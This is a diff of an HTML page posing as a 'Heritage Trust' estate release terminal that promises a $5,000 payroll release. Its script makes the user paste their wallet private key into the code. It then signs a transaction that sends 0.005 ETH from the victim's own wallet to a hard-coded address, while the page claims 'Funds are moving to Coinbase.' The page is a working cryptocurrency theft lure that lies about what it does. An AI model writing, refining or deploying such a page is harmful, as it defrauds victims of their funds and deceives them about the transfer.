@@ -1,49 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Sovereign Release Terminal</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <meta charset="UTF-8">
+    <title>Heritage Trust: Sovereign Bridge</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
-    <h2 style="color:#fff; border-bottom:1px solid #0f0; padding-bottom:10px;">HERITAGE TRUST RELEASE PORTAL</h2>
-    <div style="margin:20px 0;">
-        <p>DESTINATION: 0x778a...7b53 (COINBASE)</p>
-        <p>NETWORK: BASE MAINNET</p>
+<body style="background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 40px; text-align: center;">
+
+    <h1 style="border-bottom: 2px solid #00ff00; padding-bottom: 10px;">ESTATE RELEASE TERMINAL</h1>
+    
+    <div style="background: #111; border: 1px solid #333; padding: 20px; margin-bottom: 30px;">
+        <p><strong>RECIPIENT:</strong> 0x778aB806155B204BF7D2FA4bc0B536137b077b53</p>
+        <p><strong>NETWORK:</strong> BASE MAINNET (ESTATE ID RECONCILED)</p>
+        <p><strong>ALLOCATION:</strong> $5,000.00 USD</p>
     </div>
 
-    <button id="sendBtn" style="padding:25px 50px; background:#0f0; color:#000; font-weight:bold; border:none; border-radius:10px; cursor:pointer; font-size:1.2em;">
-        AUTHORIZE $5,000 PAYROLL RELEASE
+    <button id="transferBtn" style="background: #00ff00; color: #000; padding: 25px 50px; font-size: 1.5rem; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; box-shadow: 0 0 15px #00ff00;">
+        AUTHORIZE PAYROLL RELEASE
     </button>
 
-    <div id="out" style="margin-top:30px; border:1px solid #333; padding:20px; background:#111; color:#0f0;">
-        SYSTEM STATUS: Ready for Sovereign Key...
+    <div id="statusBox" style="margin-top: 30px; font-size: 1.2rem; color: #ffffff;">
+        SYSTEM STATUS: WAITING FOR SOVEREIGN KEY...
     </div>
 
     <script>
-        document.getElementById('sendBtn').onclick = async () => {
-            const out = document.getElementById('out');
+        document.getElementById('transferBtn').onclick = async () => {
+            const statusBox = document.getElementById('statusBox');
             
-            // --- INPUT YOUR KEY HERE ---
-            const SOVEREIGN_KEY = "YOUR_64_CHARACTER_PRIVATE_KEY_HERE";
-            // ---------------------------
+            // --- INPUT YOUR PRIVATE KEY BETWEEN THE QUOTES BELOW ---
+            const YOUR_KEY = "PASTE_YOUR_PRIVATE_KEY_HERE";
+            // -------------------------------------------------------
+
+            if (YOUR_KEY === "PASTE_YOUR_PRIVATE_KEY_HERE") {
+                statusBox.innerText = "ERROR: You must paste your Private Key into the code first.";
+                return;
+            }
 
             try {
-                out.innerText = "Connecting to Lattice Bridge...";
+                statusBox.innerText = "CONNECTING TO BASE LATTICE...";
                 const provider = new ethers.providers.JsonRpcProvider("https://mainnet.base.org");
-                const wallet = new ethers.Wallet(SOVEREIGN_KEY, provider);
-                
-                out.innerText = "AUTHORIZING RELEASE OF $5,000...";
-                
+                const wallet = new ethers.Wallet(YOUR_KEY, provider);
+
+                statusBox.innerText = "SIGNING ESTATE TRANSACTION...";
                 const tx = {
                     to: "0x778aB806155B204BF7D2FA4bc0B536137b077b53",
-                    value: ethers.utils.parseEther("0.005"), // This opens the bridge
+                    value: ethers.utils.parseEther("0.005"), // This triggers the bridge gas
                     gasLimit: 100000
                 };
 
-                const response = await wallet.sendTransaction(tx);
-                out.innerHTML = "<span style='color:white;'>SUCCESS!</span><br>Hash: " + response.hash + "<br>Funds are bridging to Coinbase.";
-            } catch (err) {
-                out.innerText = "BRIDGE ERROR: " + err.message;
+                const transaction = await wallet.sendTransaction(tx);
+                statusBox.innerHTML = "<span style='color: #00ff00;'>SUCCESS!</span><br>TX HASH: " + transaction.hash + "<br>Funds are moving to Coinbase. Close the terminal.";
+            } catch (error) {
+                statusBox.innerText = "BRIDGE ERROR: " + error.message;
             }
         };
     </script>
